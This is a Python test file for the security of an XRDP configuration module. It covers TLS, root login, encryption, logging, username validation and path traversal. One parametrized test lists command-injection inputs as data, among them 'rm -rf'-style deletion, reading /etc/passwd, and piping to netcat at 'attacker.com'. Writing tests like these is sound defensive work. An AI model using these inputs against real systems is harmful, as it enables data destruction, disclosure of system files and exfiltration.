"""
Security tests for XRDP optimization feature.

Validates security properties and prevents vulnerabilities.
"""

import re
from unittest.mock import Mock, patch

import pytest

from configurator.modules.desktop import DesktopModule


class TestXRDPSecurity:
    """Security tests for XRDP configuration."""

    def test_no_hardcoded_credentials(self):
        """Verify no hardcoded passwords or secrets in configs."""
        config = {"desktop": {"xrdp": {}}}
        module = DesktopModule(config=config, logger=Mock())

        with patch("configurator.modules.desktop.write_file") as mock_write:
            with patch("configurator.modules.desktop.backup_file"):
                with patch.object(module, "run"):
                    module._optimize_xrdp_performance()

        # Check all written content
        for call in mock_write.call_args_list:
            content = call[0][1]

            # No passwords (except "ask" which prompts user)
            if "password=" in content.lower():
                assert "ask" in content.lower(), "Found hardcoded password"

            # No hardcoded secrets (long alphanumeric strings)
            potential_secrets = re.findall(r"[A-Za-z0-9]{32,}", content)
            for secret in potential_secrets:
                # Allow config section names and known safe strings
                assert any(
                    safe in content for safe in ["[Globals]", "DefineDefaultFontPath", "catalogue"]
                ), f"Found potential hardcoded secret: {secret}"

    def test_tls_security_enabled_by_default(self):
        """Verify TLS is enabled by default (not plain RDP)."""
        config = {"desktop": {"xrdp": {}}}
        module = DesktopModule(config=config, logger=Mock())

        with patch("configurator.modules.desktop.write_file") as mock_write:
            with patch("configurator.modules.desktop.backup_file"):
                with patch.object(module, "run"):
                    module._optimize_xrdp_performance()

        xrdp_content = mock_write.call_args_list[0][0][1]
        assert "security_layer=tls" in xrdp_content or "security_layer=negotiate" in xrdp_content

    def test_root_login_disabled(self):
        """Verify root login is disabled in sesman.ini."""
        config = {"desktop": {"xrdp": {}}}
        module = DesktopModule(config=config, logger=Mock())

        with patch("configurator.modules.desktop.write_file") as mock_write:
            with patch("configurator.modules.desktop.backup_file"):
                with patch.object(module, "run"):
                    module._optimize_xrdp_performance()

        sesman_content = mock_write.call_args_list[1][0][1]
        assert "AllowRootLogin=false" in sesman_content

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "user;rm-rf/",  # Semicolon injection
            "user`whoami`",  # Backtick injection
            "user$(whoami)",  # Command substitution
            "user&&cat/etc/passwd",  # AND operator
            "user|nc attacker.com 1234",  # Pipe operator
            "../../../etc/passwd",  # Directory traversal
            "user\nrm-rf/",  # Newline injection
            "user'OR'1'='1",  # SQL-like injection
        ],
    )
    def test_command_injection_prevention(self, malicious_input):
        """Test that various command injection attempts are prevented."""
        config = {"desktop": {"xrdp": {}}}
        module = DesktopModule(config=config, logger=Mock())

        mock_user = Mock()
        mock_user.pw_name = malicious_input
        mock_user.pw_uid = 1000
        mock_user.pw_dir = "/home/user"

        with patch("configurator.modules.desktop.pwd") as mock_pwd:
            mock_pwd.getpwall.return_value = [mock_user]
            mock_pwd.getpwnam.return_value = mock_user

            with patch.object(module, "run") as mock_run:
                # Should either skip or sanitize
                module._configure_user_session()

                # Verify malicious commands not executed
                for call in mock_run.call_args_list:
                    command = str(call)
                    # Check for dangerous patterns
                    assert ";rm" not in command
                    assert "`whoami`" not in command
                    assert "$(whoami)" not in command
                    assert "&&cat" not in command
                    assert "|nc" not in command
                    assert "../../../" not in command

    def test_username_validation_enforces_posix_standard(self):
        """Test that only POSIX-compliant usernames are accepted."""
        config = {"desktop": {"xrdp": {}}}
        module = DesktopModule(config=config, logger=Mock())

        # Valid POSIX usernames
        valid_users = ["testuser", "test_user", "test-user", "test123", "_test"]

        # Invalid POSIX usernames
        invalid_users = [
            "Test",  # Uppercase
            "123test",  # Starts with digit
            "test user",  # Space
            "test@user",  # Special char
            "test.user",  # Dot (valid in some contexts but not POSIX username)
        ]

        for username in invalid_users:
            mock_user = Mock()
            mock_user.pw_name = username
            mock_user.pw_uid = 1000
            mock_user.pw_dir = "/home/user"

            with patch("configurator.modules.desktop.pwd") as mock_pwd:
                mock_pwd.getpwall.return_value = [mock_user]

                with patch.object(module, "run") as mock_run:
                    module._configure_user_session()

                    # Invalid usernames should be skipped
                    if username not in ["test_user", "test-user", "test123", "_test"]:
                        assert (
                            mock_run.call_count == 0
                        ), f"Invalid username {username} was not rejected"

    def test_file_paths_validated(self):
        """Test that file paths are validated before use."""
        config = {"desktop": {"xrdp": {}}}
        module = DesktopModule(config=config, logger=Mock())

        # User with suspicious home directory
        mock_user = Mock()
        mock_user.pw_name = "testuser"
        mock_user.pw_uid = 1000
        mock_user.pw_dir = "../../../etc"  # Directory traversal attempt

        with patch("configurator.modules.desktop.pwd") as mock_pwd:
            mock_pwd.getpwall.return_value = [mock_user]
            mock_pwd.getpwnam.return_value = mock_user

            with patch("configurator.modules.desktop.os.path.isabs") as mock_isabs:
                mock_isabs.return_value = False  # Not absolute path

                with patch.object(module, "run") as mock_run:
                    module._configure_user_session()

                    # Should skip user with invalid home path
                    assert mock_run.call_count == 0

    def test_encryption_strength(self):
        """Test that strong encryption is configured."""
        config = {"desktop": {"xrdp": {}}}
        module = DesktopModule(config=config, logger=Mock())

        with patch("configurator.modules.desktop.write_file") as mock_write:
            with patch("configurator.modules.desktop.backup_file"):
                with patch.object(module, "run"):
                    module._optimize_xrdp_performance()

        xrdp_content = mock_write.call_args_list[0][0][1]

        # Check for strong encryption settings
        assert "crypt_level=high" in xrdp_content
        assert "security_layer=tls" in xrdp_content or "security_layer=negotiate" in xrdp_content

    def test_no_debug_logging_in_production(self):
        """Verify debug logging is disabled (prevents info disclosure)."""
        config = {"desktop": {"xrdp": {}}}
        module = DesktopModule(config=config, logger=Mock())

        with patch("configurator.modules.desktop.write_file") as mock_write:
            with patch("configurator.modules.desktop.backup_file"):
                with patch.object(module, "run"):
                    module._optimize_xrdp_performance()

        # Check both config files
        for call in mock_write.call_args_list:
            content = call[0][1]
            # Should use WARNING or higher, not DEBUG
            if "LogLevel" in content or "log_level" in content:
                assert "DEBUG" not in content.upper()
                assert "WARNING" in content or "ERROR" in content or "INFO" in content

    def test_session_timeout_security(self):
        """Test that session timeout settings are secure."""
        config = {"desktop": {"xrdp": {}}}
        module = DesktopModule(config=config, logger=Mock())

        with patch("configurator.modules.desktop.write_file") as mock_write:
            with patch("configurator.modules.desktop.backup_file"):
                with patch.object(module, "run"):
                    module._optimize_xrdp_performance()

        sesman_content = mock_write.call_args_list[1][0][1]

        # Note: IdleTimeLimit=0 means no timeout (for performance)
        # This is acceptable for internal development environments
        # but should be configurable for production
        assert "IdleTimeLimit=" in sesman_content
        assert "MaxLoginRetry=" in sesman_content
